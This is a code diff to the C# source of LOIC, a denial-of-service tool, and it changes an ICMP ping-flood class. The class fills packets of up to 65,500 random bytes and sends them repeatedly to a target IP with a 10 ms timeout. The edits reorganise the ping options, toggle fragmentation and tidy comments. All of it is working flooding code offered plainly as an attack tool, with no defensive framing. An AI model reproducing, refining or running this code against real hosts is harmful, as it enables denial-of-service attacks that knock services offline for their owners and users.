@@ -557,19 +557,26 @@ namespace LOIC
            this._RandomMessage = RandomMessage;
            this._BytesToSend = new byte[65000];
            this._random = new Random();
-            
-           _opt = new PingOptions();
-           _opt.DontFragment = false;
+
+           this._opt = new PingOptions();
+           this._opt.DontFragment = false;
+           this._opt.Ttl = 128;
+
+            _opt = new PingOptions();
+            if (RandomMessage)
+            {
+                _opt.DontFragment = false;
+            }else
+            {
+                _opt.DontFragment = true;
+            }
+
            _opt.Ttl = 128;
-           
+                            
           
-
-            
-            
-
         }
 
-        //add start override
+       
 
         public override void Start()
         {
@@ -579,7 +586,7 @@ namespace LOIC
             this.bw.RunWorkerAsync();
             this.bw.WorkerSupportsCancellation = true;
         }
-        //add stop override
+      
 
         public override void Stop()
         {
@@ -587,9 +594,6 @@ namespace LOIC
             this.bw.CancelAsync();
         }
        
-
-
-
         //while working away
         private  void bw_DoWork (object sender, EventArgs e){
 
@@ -600,10 +604,7 @@ namespace LOIC
                 if (_RandomMessage)
                 {
                     _BytesToSend = new Byte[65500];
-                    //fill an array with 0 to 65499 random bytes bytes 
-
-
-
+                    //fill an array with 0 to 65499 random bytes bytes               
                     int b = 0;
                     while (b < _random.Next(0,65499))
                     {
@@ -612,15 +613,7 @@ namespace LOIC
                     }
                 }
                
-                    
-                
-
-
-
-
-                PingOptions opt = new PingOptions();
-                opt.DontFragment = false;
-                opt.Ttl = 128;
+                                                 
                 State = ReqState.Ready;
 
                 for (int i = 0; i < _PingsPerThread; i++)
@@ -628,11 +621,9 @@ namespace LOIC
                     State = ReqState.Connecting;
                     try
                     {
-
                         //send the data with a timeout value of 10ms 
-                        _pingSender.SendAsync(_ip, 10, _BytesToSend, opt);
+                        _pingSender.SendAsync(_ip, 10, _BytesToSend, _opt);
                         Requested++;
-
                     }
                    
                     catch (Exception)
@@ -644,7 +635,7 @@ namespace LOIC
                     {
                         _pingSender.SendAsyncCancel();
                         _pingSender.Dispose();
-                        Requested++;
+                       
                     }
                     catch { }
                     State = ReqState.Completed;
